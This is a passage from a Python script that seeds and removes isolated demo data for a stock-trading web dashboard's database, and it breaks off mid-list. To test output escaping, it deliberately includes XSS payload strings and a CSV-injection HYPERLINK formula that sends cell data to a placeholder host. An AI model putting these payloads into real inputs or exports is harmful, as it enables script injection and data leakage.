# -*- coding: utf-8 -*-
"""
웹 화면 검증용 DEMO 데이터 적재/삭제 스크립트.

  python tools/demo_data.py load    # DEMO 데이터 적재
  python tools/demo_data.py clear   # DEMO 데이터 삭제 (작업 종료 시 반드시 실행)
  python tools/demo_data.py status  # 현재 DEMO 데이터 잔존 여부 확인

원칙
  * 실 데이터를 오염시키지 않도록 계좌 account_no='DEMO-0000', env='mock' 로 격리한다.
  * 계좌에 종속되지 않는 표(event_log / signal_log / api_call_log / algo_run /
    algorithm_param_history / event_archive / api_error_log)는 '[DEMO]' 마커 또는
    고정 작성자명으로 표시해 clear 시 그 행만 정확히 지운다.
    llm_decision_log 는 stk_cd 접두 'DEMO' 로 격리한다.
  * 거래 분석 화면 검증용으로 신호 → 주문 → 체결 → order_event 타임라인
    (성공 / 부분체결 / 거부 / 실패 / 차단 / 관찰만) 시나리오를 함께 적재한다.
  * 보유종목에는 상장폐지 종목(현재가 0, 종목명 '(폐)' 시작) 1건을 포함해
    웹 화면의 상장폐지 표시/실제 수익률 계산을 검증할 수 있게 한다.
  * 전역 표(system_setting / server_status / algorithm_selection)는 건드리지 않는다.
    (서버 모듈 stock_svr 이 같은 DB 를 동시에 사용하기 때문)
  * DB 접속정보는 server/config/config.local.ini 의 [db] (stock_svr 계정)에서 읽는다.
  * 로그인 잠금 검증용 임시 계정(demo_lock_test)의 비밀번호는 환경변수
    STOCK_TEST_PW (또는 STOCK_DEMO_PW) 로만 받으며, 소스/로그/화면에 남기지 않는다.
"""
from __future__ import annotations

import configparser
import datetime as dt
import json
import os
import random
import subprocess
import sys
from pathlib import Path

try:
    import pymysql
except ImportError:  # pragma: no cover
    print("pymysql 이 필요합니다: pip install pymysql", file=sys.stderr)
    raise SystemExit(2)

ROOT = Path(__file__).resolve().parent.parent
INI = ROOT / "server" / "config" / "config.local.ini"
PHP_EXE = r"D:\xampp\php\php.exe"

DEMO_ACCOUNT_NO = "DEMO-0000"
DEMO_ENV = "mock"
DEMO_ALIAS = "DEMO 검증용(삭제 예정)"
DEMO_MARK = "[DEMO]"
DEMO_AUTHOR = "demo_seed"
DEMO_LOCK_USER = "demo_lock_test"
# llm_decision_log 데모 행은 stk_cd 접두 'DEMO' 로 식별해 clear 시 정확히 회수한다.
DEMO_LLM_PREFIX = "DEMO"

# 상장폐지·거래불가 보유종목 데모 1건 (현재가 0, 매입금액 > 0, 키움이 주는 prft_rt=0)
DELISTED_STOCK = ("DEMO0001", "(폐)데모폐지", 200, 1_805)

STOCKS = [
    ("005930", "삼성전자", 71_500),
    ("000660", "SK하이닉스", 183_000),
    ("035420", "NAVER", 168_000),
    ("051910", "LG화학", 412_000),
    ("247540", "에코프로비엠", 215_000),
]


# ----------------------------------------------------------------- 접속
def connect():
    if not INI.exists():
        raise SystemExit(f"설정 파일을 찾을 수 없습니다: {INI}")
    cp = configparser.ConfigParser(interpolation=None)
    cp.read(INI, encoding="utf-8")
    if "db" not in cp:
        raise SystemExit("config.local.ini 에 [db] 섹션이 없습니다.")
    d = cp["db"]
    return pymysql.connect(
        host=d.get("host", "127.0.0.1"),
        port=int(d.get("port", "3306")),
        user=d.get("user", ""),
        password=d.get("password", ""),
        database=d.get("name", ""),
        charset="utf8mb4",
        autocommit=False,
        cursorclass=pymysql.cursors.DictCursor,
    )


def php_password_hash(plain: str) -> str:
    """PHP password_hash() 와 동일한 해시를 PHP CLI 로 생성(비밀번호는 환경변수로만 전달)."""
    if not Path(PHP_EXE).exists():
        raise SystemExit(f"php.exe 를 찾을 수 없습니다: {PHP_EXE}")
    env = dict(os.environ)
    env["STOCK_TMP_PW"] = plain
    out = subprocess.run(
        [PHP_EXE, "-n", "-r", 'echo password_hash(getenv("STOCK_TMP_PW"), PASSWORD_DEFAULT);'],
        capture_output=True, text=True, env=env, check=True,
    )
    h = out.stdout.strip()
    if not h.startswith("$2y$"):
        raise SystemExit("비밀번호 해시 생성에 실패했습니다.")
    return h


# ------------------------------------------------- 거래 분석용 데모 맥락 JSON
def params_snapshot_json(algo: str) -> str:
    """주문 시점 파라미터 스냅샷(risk_guard + 진입 알고리즘) 데모 JSON."""
    entry = {
        "momentum_screen": {"min_volume_ratio": 2.0, "lookback_days": 5, "score_threshold": 7.5},
        "volatility_breakout": {"k": 0.5, "use_prev_range": True, "entry_time": "09:05"},
        "averaging_down": {"drop_pct_step": -5.0, "max_steps": 3, "step_qty_ratio": 0.5},
        "ma_cross_filter": {"short": 5, "long": 20, "confirm_bars": 1},
    }.get(algo, {"note": "기본값"})
    return json.dumps(
        {"risk_guard": {"max_position_pct": 20, "stop_loss_pct": -12, "max_orders_per_day": 20,
                        "trade_start_time": "09:10", "trade_end_time": "15:15"},
         algo: entry},
        ensure_ascii=False)


def signal_context_json(kind: str, score: float, close: int, extra: dict | None = None) -> str:
    ctx = {"kind": kind, "score": round(score, 2), "close": close,
           "meta": {"market": "KOSPI", "session": "regular"}}
    if extra:
        ctx.update(extra)
    return json.dumps(ctx, ensure_ascii=False)


def load_analysis(cur, acct: int, run_id: int, now: dt.datetime) -> None:
    """
    거래 분석 화면 검증용 시나리오.
      성공(체결) / 부분체결 / 거부(+사유) / 실패 / 차단(BLOCK) / 관찰만(is_dry_run)
    각 건은 signal_log → orders → executions → order_event 타임라인 → llm_decision_log 로 이어진다.
    모든 행은 [DEMO] 마커 또는 DEMO 계좌/DEMO 종목코드로 격리되어 clear 로 완전히 회수된다.
    """
    xss = "<script>alert('xss')</script>"
    # (코드, 종목명, 알고리즘, 매매, 신호유형, 수량, 신호가, 체결가, 체결수량, 상태,
    #  응답코드, 응답메시지, 거부사유, 분 전, 이벤트, llm(판단, 최종, 확신도, 근거))
    scen = [
        dict(code="DEMOA001", name="데모성공종목", algo="momentum_screen", side="BUY", sig="BUY",
             qty=10, sig_price=70_000, fill=70_140, filled=10, status="FILLED",
             rc=0, rmsg="정상처리", reject=None, mins=25, dry=0,
             detail="거래량 2.6배 · MA5 > MA20 정배열로 진입 조건 충족",
             ctx=signal_context_json("breakout", 8.42, 70_000, {"ma5": 69_200, "ma20": 67_800, "vol_ratio": 2.6}),
             llm=("allow", "pass", 82, "거래량 증가와 정배열이 확인되어 진입 근거가 충분합니다."),
             events=[(0, "CREATED", "SENT", 0, 10, 70_000, None, None, "주문 생성 (신호가 70,000)", "EXECUTOR"),
                     (2, "SENT", "SENT", 0, 10, 70_000, None, 0, "키움 REST 주문 전송 성공", "REST"),
                     (5, "ACCEPTED", "ACCEPTED", 0, 10, 70_000, None, None, "거래소 접수", "WS"),
                     (31, "FILLED", "FILLED", 10, 0, 70_140, None, None, "전량 체결", "WS")]),
        dict(code="DEMOA002", name="데모부분체결", algo="volatility_breakout", side="BUY", sig="BUY",
             qty=20, sig_price=52_000, fill=52_600, filled=7, status="PARTIAL",
             rc=0, rmsg="정상처리", reject=None, mins=48, dry=0,
             detail="전일 변동폭 돌파(k=0.5) — 목표가 52,300 상향 돌파",
             ctx=signal_context_json("breakout", 6.10, 52_000, {"target": 52_300, "k": 0.5, "prev_range": 1_400}),
             llm=("allow", "pass", 61, "돌파는 유효하나 거래량이 평균 수준이라 분할 진입을 권합니다."),
             events=[(0, "CREATED", "SENT", 0, 20, 52_000, None, None, "주문 생성 (지정가 52,300)", "EXECUTOR"),
                     (1, "SENT", "SENT", 0, 20, 52_300, None, 0, "키움 REST 주문 전송 성공", "REST"),
                     (4, "ACCEPTED", "ACCEPTED", 0, 20, 52_300, None, None, "거래소 접수", "WS"),
                     (66, "PARTIAL", "PARTIAL", 7, 13, 52_600, None, None, "부분 체결 7주 · 잔량 13주", "WS")]),
        dict(code="DEMOA003", name="데모거부종목", algo="averaging_down", side="BUY", sig="BUY",
             qty=5, sig_price=118_000, fill=None, filled=0, status="REJECTED",
             rc=919, rmsg="주문거부", reject=f"증거금 부족 — 주문가능금액 초과 {xss}", mins=95, dry=0,
             detail="평단 대비 -6.8% 구간 · 추가 매수 2/3 단계",
             ctx=signal_context_json("avg_down", 4.30, 118_000, {"avg_price": 126_600, "drop_pct": -6.8, "step": 2}),
             llm=("allow", "pass", 55, "한도 내 물타기이나 잔여 현금이 부족할 수 있습니다."),
             events=[(0, "CREATED", "SENT", 0, 5, 118_000, None, None, "주문 생성", "EXECUTOR"),
                     (1, "SENT", "SENT", 0, 5, 118_000, None, 0, "키움 REST 주문 전송 성공", "REST"),
                     (3, "REJECTED", "REJECTED", 0, 5, None, f"증거금 부족 — 주문가능금액 초과 {xss}", 919,
                      "거래소 주문 거부 (WS 919)", "WS")]),
        dict(code="DEMOA004", name="데모실패종목", algo="momentum_screen", side="SELL", sig="SELL",
             qty=3, sig_price=205_000, fill=None, filled=0, status="FAILED",
             rc=-1, rmsg="주문 전송 실패 (HTTP 500 · 응답 없음)", reject=None, mins=140, dry=0,
             detail="목표 수익률 도달 — 익절 신호",
             ctx=signal_context_json("take_profit", 7.05, 205_000, {"entry_price": 188_000, "gain_pct": 9.04}),
             llm=("error", "block", None, ""),
             events=[(0, "CREATED", "SENT", 0, 3, 205_000, None, None, "주문 생성", "EXECUTOR"),
                     (1, "SENT", "SENT", 0, 3, 205_000, None, None, "키움 REST 주문 전송 시도", "REST"),
                     (11, "FAILED", "FAILED", 0, 3, None, None, -1,
                      "HTTP 500 · 10초 내 응답 없음 — 재시도 중단", "REST")]),
        dict(code="DEMOA005", name="데모차단종목", algo="risk_guard", side=None, sig="BLOCK",
             qty=None, sig_price=None, fill=None, filled=None, status=None,
             rc=None, rmsg=None, reject=None, mins=180, dry=0,
             detail="리스크 가드: 일 손실 한도(-3%) 도달로 신규 진입 차단",
             ctx=signal_context_json("risk_block", 0.0, 44_500, {"day_pl_pct": -3.12, "limit_pct": -3.0}),
             llm=("block", "block", 35, "일 손실 한도에 도달해 추가 진입은 위험합니다."),
             events=[]),
        dict(code="DEMOA006", name=f"데모검증{xss}", algo="ma_cross_filter", side="BUY", sig="BUY",
             qty=4, sig_price=9_800, fill=None, filled=0, status="SIGNAL_ONLY",
             # CSV 인젝션 방지 검증용 — 내보낸 CSV 에서 이 셀은 앞에 작은따옴표가 붙어야 한다.
             rc=None, rmsg=None, reject='=HYPERLINK("http://demo.invalid/?x="&A1,"CSV 인젝션 검증")',
             mins=240, dry=1,
             detail=f"골든크로스 신호 · 이스케이프 검증 {xss} <img src=x onerror=alert(1)>",
             ctx='{"kind":"ma_cross","note":"' + xss + '","quote":"\\" onmouseover=alert(1) x=\\""}',
             llm=("allow", "pass", 70, f"관찰 모드 기록입니다 {xss}"),
             events=[(0, "CREATED", "SIGNAL_ONLY", 0, 4, 9_800, None, None,
                      f"주문 게이트 OFF — 신호만 기록 {xss}", "EXECUTOR")]),
    ]

    sig_rows, ord_evt_rows, exec_rows, llm_rows = [], [], [], []
    for s in scen:
        ts = now - dt.timedelta(minutes=s["mins"])
        order_id = None
        ord_no = None
        if s["status"] is not None:
            ord_no = None if s["dry"] else f"95{s['code'][-4:]}"
            cur.execute(
                "INSERT INTO orders (account_id, run_id, algo_code, ord_no, side, order_kind, stk_cd, stk_nm,"
                " dmst_stex_tp, trde_tp, ord_qty, ord_uv, status, filled_qty, avg_fill_pric, reason,"
                " return_code, return_msg, is_dry_run, created_at, signal_price, signal_context,"
                " params_snapshot, reject_reason)"
                " VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)",
                (acct, run_id, s["algo"], ord_no, s["side"], "NEW", s["code"], s["name"], "KRX", "0",
                 s["qty"], s["sig_price"], s["status"], s["filled"] or 0, s["fill"],
                 f"{DEMO_MARK} {s['detail']}", s["rc"], s["rmsg"], s["dry"], ts,
                 s["sig_price"], s["ctx"], params_snapshot_json(s["algo"]), s["reject"]))
            order_id = cur.lastrowid
            for (sec, etype, status, fq, rq, price, reject, rc, msg, src) in s["events"]:
                ord_evt_rows.append((order_id, acct, ord_no, ts + dt.timedelta(seconds=sec), etype,
                                     status, fq, rq, price, reject, rc, f"{DEMO_MARK} {msg}", src))
            if s["filled"]:
                exec_rows.append((acct, ord_no, f"C{s['code']}", s["code"], s["name"], s["side"],
                                  s["filled"], s["fill"],
                                  int(s["fill"] * s["filled"] * 0.00015),
                                  int(s["fill"] * s["filled"] * 0.0018) if s["side"] == "SELL" else 0,
                                  ts + dt.timedelta(seconds=40), "WS"))
        try:
            score = float(json.loads(s["ctx"]).get("score", 0) or 0)
        except Exception:
            score = 0.0
        sig_rows.append((run_id, s["algo"], s["code"], s["name"], s["sig"], round(score, 4),
                         f"{DEMO_MARK} {s['detail']}", order_id, ts))
        dec, final, conf, reasons = s["llm"]
        llm_rows.append((ts, run_id, s["code"], s["name"], s["algo"], s["side"] or "BUY",
                         "claude-sonnet-4-5", dec, final, conf, reasons, "", s["ctx"], 0,
                         1200, 900, 140, None if dec != "error" else "API timeout (10s) — fail_mode=block 적용",
                         order_id))

    if ord_evt_rows:
        cur.executemany(
            "INSERT INTO order_event (order_id, account_id, ord_no, event_time, event_type, status,"
            " filled_qty, remain_qty, price, reject_reason, return_code, message, source)"
            " VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)", ord_evt_rows)
    if exec_rows:
        cur.executemany(
            "INSERT INTO executions (account_id, ord_no, cntr_no, stk_cd, stk_nm, side, cntr_qty, cntr_pric,"
            " cmsn, tax, executed_at, source) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)", exec_rows)
    cur.executemany(
        "INSERT INTO signal_log (run_id, algo_code, stk_cd, stk_nm, signal_type, score, detail, order_id,"
        " created_at) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s)", sig_rows)
    cur.executemany(
        "INSERT INTO llm_decision_log (created_at, run_id, stk_cd, stk_nm, source_algo, side, model,"
        " decision, final_action, confidence, reasons, risk_flags, input_summary, from_cache,"
        " latency_ms, input_tokens, output_tokens, error_msg, order_id)"
        " VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)", llm_rows)
    print(f"거래분석 데모: signal_log {len(sig_rows)}건 / order_event {len(ord_evt_rows)}건 /"
          f" executions {len(exec_rows)}건 / llm_decision_log {len(llm_rows)}건")

    # ---------------------------------------------------- 이벤트 영구 보관본
    arch = [
        ("ERROR", "order", "주문 거부 — DEMOA003 증거금 부족 (WS 919)", 95),
        ("ERROR", "api", "키움 REST 주문 전송 실패 — HTTP 500 (재시도 2회 후 포기)", 140),
        ("WARN", "algo", "risk_guard: 일 손실 한도(-3%) 도달 — 신규 진입 차단", 180),
        ("WARN", "ws", "체결 통보 지연 12초 — 주문 상태 재조회", 210),
        ("INFO", "order", "전량 체결 — DEMOA001 10주 @70,140", 25),
        ("INFO", "system", "엔진 기동 (관찰모드, 주문 전송 비활성)", 400),
        ("ERROR", "engine", "포지션 동기화 실패 — 다음 주기에 재시도", 520),
    ]
    arch_rows = [(now - dt.timedelta(minutes=m), lv, cat, f"{DEMO_MARK} {msg}") for (lv, cat, msg, m) in arch]
    cur.executemany(
        "INSERT INTO event_archive (created_at, level, category, message) VALUES (%s,%s,%s,%s)", arch_rows)
    print(f"event_archive: {len(arch_rows)}건")

    # ---------------------------------------------------- API 오류 영구 보관본
    api_err = [
        ("kt10000", 500, -1, "서버 내부 오류 — 주문 전송 실패", 10_240, 140),
        ("ka10027", 200, 1700, "허용 요청 수 초과 — 백오프 후 재시도", 310, 200),
        ("kt00018", 200, 8004, "조회 조건 오류 (연속조회 키 만료)", 420, 260),
        ("ka10075", 401, 8005, "토큰 만료 — 재발급 후 재시도", 180, 330),
        ("kt10001", 200, 919, "주문 거부 — 증거금 부족", 260, 95),
    ]
    api_rows = [(now - dt.timedelta(minutes=m), api, hs, rc, f"{DEMO_MARK} {msg}", ms)
                for (api, hs, rc, msg, ms, m) in api_err]
    cur.executemany(
        "INSERT INTO api_error_log (created_at, api_id, http_status, return_code, return_msg, elapsed_ms)"
        " VALUES (%s,%s,%s,%s,%s,%s)", api_rows)
    print(f"api_error_log: {len(api_rows)}건")


# ----------------------------------------------------------------- 적재
def demo_account_id(cur) -> int | None:
    cur.execute("SELECT id FROM account WHERE account_no=%s AND env=%s", (DEMO_ACCOUNT_NO, DEMO_ENV))
    row = cur.fetchone()
    return int(row["id"]) if row else None


def load(conn) -> None:
    rnd = random.Random(20260919)
    now = dt.datetime.now().replace(microsecond=0)
    today = now.date()

    with conn.cursor() as cur:
        # ---------------------------------------------------- 계좌
        cur.execute(
            "INSERT INTO account (account_no, env, alias, is_active) VALUES (%s,%s,%s,1) "
            "ON DUPLICATE KEY UPDATE alias=VALUES(alias), is_active=1",
            (DEMO_ACCOUNT_NO, DEMO_ENV, DEMO_ALIAS),
        )
        acct = demo_account_id(cur)
        assert acct is not None
        print(f"account_id = {acct} ({DEMO_ACCOUNT_NO}/{DEMO_ENV})")

        # ---------------------------------------------------- 잔고 스냅샷 30일
        cur.execute("DELETE FROM account_balance WHERE account_id=%s", (acct,))
        entr = 12_000_000
        pur = 8_000_000
        rows = []
        for i in range(29, -1, -1):
            day = today - dt.timedelta(days=i)
            drift = rnd.uniform(-0.018, 0.022)
            evlt = int(pur * (1 + 0.03 + drift * (30 - i) / 12))
            pl = evlt - pur
            rt = round(pl / pur * 100, 4)
            snap = dt.datetime.combine(day, dt.time(15, 40, 0))
            rows.append((acct, snap, entr, entr + 120_000, entr + 250_000,
                         entr - 500_000, entr - 800_000, pur, evlt, pl, rt, entr + evlt))
        cur.executemany(
            "INSERT INTO account_balance (account_id, snapshot_at, entr, d1_entra, d2_entra, ord_alow_amt,"
            " pymn_alow_amt, tot_pur_amt, tot_evlt_amt, tot_evlt_pl, tot_prft_rt, prsm_dpst_aset_amt)"
            " VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)", rows)
        print(f"account_balance: {len(rows)}건")

        # ---------------------------------------------------- 보유종목
        cur.execute("DELETE FROM holding WHERE account_id=%s", (acct,))
        cur.execute("DELETE FROM holding_snapshot WHERE account_id=%s", (acct,))
        hold_rows, snap_rows = [], []
        total_evlt = 0
        holdings = []
        for idx, (code, name, base) in enumerate(STOCKS):
            qty = [20, 8, 12, 3, 5][idx]
            buy = int(base * rnd.uniform(0.88, 1.09))
            cur_p = base
            pur_amt = buy * qty
            evlt_amt = cur_p * qty
            pl = evlt_amt - pur_amt
            rt = round(pl / pur_amt * 100, 4)
            holdings.append((code, name, qty, buy, cur_p, pur_amt, evlt_amt, pl, rt))
            total_evlt += evlt_amt
        # 상장폐지 종목: 현재가 0 / 평가금액 0 / 평가손익 = -(매입금액+수수료) / 키움 수익률은 0.00 으로 내려온다.
        d_code, d_name, d_qty, d_buy = DELISTED_STOCK
        d_pur = d_buy * d_qty
        holdings.append((d_code, d_name, d_qty, d_buy, 0, d_pur, 0, -(d_pur + 50), 0))

        for (code, name, qty, buy, cur_p, pur_amt, evlt_amt, pl, rt) in holdings:
            poss = round(evlt_amt / total_evlt * 100, 4) if total_evlt else 0
            hold_rows.append((acct, code, name, qty, qty, buy, cur_p, pur_amt, evlt_amt, pl, rt, poss))
            for i in range(5):
                snap_rows.append((acct, today - dt.timedelta(days=i), code, name, qty, buy,
                                  cur_p, evlt_amt, pl, rt))
        cur.executemany(
            "INSERT INTO holding (account_id, stk_cd, stk_nm, rmnd_qty, trde_able_qty, pur_pric, cur_prc,"
            " pur_amt, evlt_amt, evltv_prft, prft_rt, poss_rt) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)",
            hold_rows)
        cur.executemany(
            "INSERT INTO holding_snapshot (account_id, snap_date, stk_cd, stk_nm, rmnd_qty, pur_pric,"
            " cur_prc, evlt_amt, evltv_prft, prft_rt) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)", snap_rows)
        print(f"holding: {len(hold_rows)}건 / holding_snapshot: {len(snap_rows)}건")

        # ---------------------------------------------------- 서버 실행 이력
        cur.execute(
            "INSERT INTO algo_run (started_at, ended_at, env, order_enabled, note)"
            " VALUES (%s,%s,%s,%s,%s)",
            (now - dt.timedelta(hours=7), None, DEMO_ENV, 0, f"{DEMO_MARK} 관찰모드 실행(웹 화면 검증용)"))
        run_id = cur.lastrowid

        # ---------------------------------------------------- 주문 / 체결
        cur.execute("DELETE FROM executions WHERE account_id=%s", (acct,))
        cur.execute("DELETE FROM orders WHERE account_id=%s", (acct,))
        algos = ["momentum_screen", "volatility_breakout", "averaging_down"]
        ord_seq = 900000
        order_rows, exec_rows = [], []
        for d in range(6):
            day = today - dt.timedelta(days=d)
            for k in range(4):
                code, name, base = STOCKS[(d + k) % len(STOCKS)]
                side = "BUY" if (d + k) % 3 else "SELL"
                qty = rnd.choice([1, 2, 3, 5])
                price = int(base * rnd.uniform(0.97, 1.03))
                ts = dt.datetime.combine(day, dt.time(9 + k, 12 + k * 7, 30))
                dry = (k == 3)  # 일부는 신호만 기록된 건으로
                ord_seq += 1
                # 신호 시점 기준가 — 주문내역/거래분석 화면의 슬리피지 계산에 쓰인다.
                sig_price = int(price * rnd.uniform(0.994, 1.004))
                order_rows.append((
                    acct, run_id, algos[(d + k) % len(algos)],
                    None if dry else str(ord_seq), side, "NEW", code, name, "KRX", "3",
                    qty, None, "SIGNAL_ONLY" if dry else "FILLED",
                    0 if dry else qty, None if dry else price,
                    f"{DEMO_MARK} " + ("주문 게이트 OFF — 신호만 기록" if dry else "알고리즘 신호에 따른 주문"),
                    None if dry else 0, None if dry else "정상처리", 1 if dry else 0, ts,
                    sig_price, params_snapshot_json(algos[(d + k) % len(algos)])))
                if not dry:
                    exec_rows.append((acct, str(ord_seq), f"C{ord_seq}", code, name, side, qty, price,
                                      int(price * qty * 0.00015), int(price * qty * 0.0018) if side == "SELL" else 0,
                                      ts + dt.timedelta(seconds=3), "WS"))
        cur.executemany(
            "INSERT INTO orders (account_id, run_id, algo_code, ord_no, side, order_kind, stk_cd, stk_nm,"
            " dmst_stex_tp, trde_tp, ord_qty, ord_uv, status, filled_qty, avg_fill_pric, reason,"
            " return_code, return_msg, is_dry_run, created_at, signal_price, params_snapshot)"
            " VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)", order_rows)
        cur.executemany(
            "INSERT INTO executions (account_id, ord_no, cntr_no, stk_cd, stk_nm, side, cntr_qty, cntr_pric,"
            " cmsn, tax, executed_at, source) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)", exec_rows)
        print(f"orders: {len(order_rows)}건 / executions: {len(exec_rows)}건")

        # ---------------------------------------------------- 거래내역(정본)
        cur.execute("DELETE FROM trade_ledger WHERE account_id=%s", (acct,))
        ledger_rows = []
        entra = 12_000_000
        for i, e in enumerate(exec_rows):
            amt = e[6] * e[7]
            entra += amt if e[5] == "SELL" else -amt
            ledger_rows.append((acct, e[10].date(), f"T{100000 + i}",
                                "매도" if e[5] == "SELL" else "매수", f"{DEMO_MARK} 자동매매",
                                e[3], e[4], e[6], e[7], amt, e[8], e[9],
                                amt - e[8] - e[9], entra, e[10].strftime("%H:%M:%S")))
        cur.executemany(
            "INSERT INTO trade_ledger (account_id, trde_dt, trde_no, trde_kind_nm, rmrk_nm, stk_cd, stk_nm,"
            " trde_qty, trde_unit, trde_amt, cmsn, tax, exct_amt, entra_remn, proc_tm)"
            " VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)", ledger_rows)
        print(f"trade_ledger: {len(ledger_rows)}건")

        # ---------------------------------------------------- 매매일지
        cur.execute("DELETE FROM daily_trade_summary WHERE account_id=%s", (acct,))
        daily_rows = []
        for d in range(6):
            day = today - dt.timedelta(days=d)
            for code, name, base in STOCKS[:3]:
                bq, sq = rnd.choice([1, 2, 3]), rnd.choice([0, 1, 2])
                bp = int(base * rnd.uniform(0.97, 1.02))
                sp = int(base * rnd.uniform(0.98, 1.05))
                buy_amt, sell_amt = bq * bp, sq * sp
                fee = int((buy_amt + sell_amt) * 0.0018)
                pl = sell_amt - (sq * bp) - fee if sq else -fee
                rt = round(pl / buy_amt * 100, 4) if buy_amt else 0
                daily_rows.append((acct, day, code, name, bq, bp, buy_amt, sq, sp, sell_amt, fee, pl, rt))
        cur.executemany(
            "INSERT INTO daily_trade_summary (account_id, base_dt, stk_cd, stk_nm, buy_qty, buy_avg_pric,"
            " buy_amt, sell_qty, sell_avg_pric, sell_amt, cmsn_tax, pl_amt, prft_rt)"
            " VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)", daily_rows)
        print(f"daily_trade_summary: {len(daily_rows)}건")

        # ---------------------------------------------------- 신호 기록
        sig_rows = []
        for d in range(4):
            for k, (code, name, base) in enumerate(STOCKS):
                st = ["BUY", "SELL", "HOLD", "BLOCK"][(d + k) % 4]
                sig_rows.append((run_id, algos[(d + k) % len(algos)], code, name, st,
                                 round(rnd.uniform(0.2, 9.8), 4),
                                 f"{DEMO_MARK} " + ("리스크 가드: 종목당 투입한도 초과로 차단" if st == "BLOCK"
                                                    else f"{name} 조건 충족 (등락률 {rnd.uniform(3, 12):.2f}%)"),
                                 now - dt.timedelta(days=d, minutes=13 * k + 5)))
        cur.executemany(
            "INSERT INTO signal_log (run_id, algo_code, stk_cd, stk_nm, signal_type, score, detail, created_at)"
            " VALUES (%s,%s,%s,%s,%s,%s,%s,%s)", sig_rows)
        print(f"signal_log: {len(sig_rows)}건")

        # ---------------------------------------------------- Claude 판단 기록
        # stk_cd 는 모두 'DEMO' 접두 → clear 시 정확히 회수된다.
        # 화면 이스케이프(h()) 검증을 위해 마지막 행에는 스크립트 문자열을 일부러 넣는다.
        xss = "<script>alert('xss')</script>"
        llm_rows = [
            # (stk_cd, stk_nm, algo, side, model, decision, final, conf, reasons, flags,
            #  input_summary, cache, latency, in_tok, out_tok, err, minutes_ago)
            (f"{DEMO_LLM_PREFIX}5930", "삼성전자(DEMO)", "momentum_screen", "BUY",
             "claude-sonnet-4-5", "allow", "pass", 78,
             "최근 5일 거래량 증가와 이동평균 정배열이 유지되어 진입 근거가 충분합니다.",
             "", '{"stk_cd":"DEMO5930","close":71500,"chg_rt":3.21,"vol_ratio":2.4,"ma5":70100,"ma20":68800}',
             0, 1840, 1250, 180, None, 12),
            (f"{DEMO_LLM_PREFIX}0660", "SK하이닉스(DEMO)", "volatility_breakout", "BUY",
             "claude-sonnet-4-5", "block", "block", 64,
             "목표가 돌파 직후 장대 음봉이 나타나 단기 되돌림 위험이 큽니다. 진입을 보류합니다.",
             "overbought,news_risk",
             '{"stk_cd":"DEMO0660","close":183000,"target":181200,"k":0.5,"prev_range":9800}',
             0, 2310, 1420, 240, None, 38),
            (f"{DEMO_LLM_PREFIX}5420", "NAVER(DEMO)", "averaging_down", "BUY",
             "claude-sonnet-4-5", "allow", "pass", 55,
             "평단 대비 -7.2% 구간이며 추가 매수 단계가 2/3 로 한도 내입니다.",
             "avg_down_step",
             '{"stk_cd":"DEMO5420","avg_price":181000,"cur":168000,"drop_pct":-7.18,"step":2,"max_steps":3}',
             1, 6, 0, 0, None, 95),
            (f"{DEMO_LLM_PREFIX}1910", "LG화학(DEMO)", "momentum_screen", "SELL",
             "claude-sonnet-4-5", "error", "block", None,
             "", "", '{"stk_cd":"DEMO1910","close":412000,"note":"응답 파싱 실패"}',
             0, 9800, 1180, 0, "API timeout (10s) — fail_mode=block 적용", 140),
            (f"{DEMO_LLM_PREFIX}7540", "에코프로비엠(DEMO)", "ma_cross_filter", "BUY",
             "claude-sonnet-4-5", "allow", "pass", 81,
             "단기 이동평균이 장기 이동평균을 상향 돌파했고 수급도 안정적입니다.",
             "", '{"stk_cd":"DEMO7540","ma5":213400,"ma20":208900,"cross":"golden"}',
             1, 5, 0, 0, None, 210),
            (f"{DEMO_LLM_PREFIX}0001", f"데모검증{xss}", "risk_guard", "SELL",
             "claude-sonnet-4-5", "block", "block", 30,
             f"XSS 이스케이프 검증용 근거 {xss} <img src=x onerror=alert(1)>",
             "<b>flag</b>&amp;",
             '{"stk_cd":"DEMO0001","note":"' + xss + '","quote":"\\" onmouseover=alert(1) x=\\""}',
             0, 1520, 990, 150, None, 300),
        ]
        cur.executemany(
            "INSERT INTO llm_decision_log (created_at, run_id, stk_cd, stk_nm, source_algo, side, model,"
            " decision, final_action, confidence, reasons, risk_flags, input_summary, from_cache,"
            " latency_ms, input_tokens, output_tokens, error_msg)"
            " VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)",
            [(now - dt.timedelta(minutes=r[16]), run_id, r[0], r[1], r[2], r[3], r[4], r[5], r[6], r[7],
              r[8], r[9], r[10], r[11], r[12], r[13], r[14], r[15]) for r in llm_rows])
        print(f"llm_decision_log: {len(llm_rows)}건")

        # ---------------------------------------------------- 이벤트 로그
        ev = [
            ("INFO", "system", "서버 시작 (관찰모드, 주문 전송 비활성)"),
            ("INFO", "auth", "키움 REST 토큰 발급 성공"),
            ("INFO", "ws", "WebSocket 접속 및 구독 완료 (00/04/0s)"),
            ("INFO", "sync", "계좌 잔고 동기화 완료 (보유 5종목)"),
            ("WARN", "api", "요청 수 초과(1700) — 3초 백오프 후 재시도"),
            ("INFO", "algo", "momentum_screen 후보 5종목 선정"),
            ("WARN", "algo", "risk_guard: 일 손실 한도 근접 (-2.7%)"),
            ("ERROR", "ws", "WebSocket 연결 끊김 — 재접속 시도"),
            ("INFO", "ws", "WebSocket 재접속 성공"),
            ("INFO", "order", "신호 기록 (주문 게이트 OFF) — 005930 매수 2주"),
            ("DEBUG", "sync", "미체결 조회 응답 0건"),
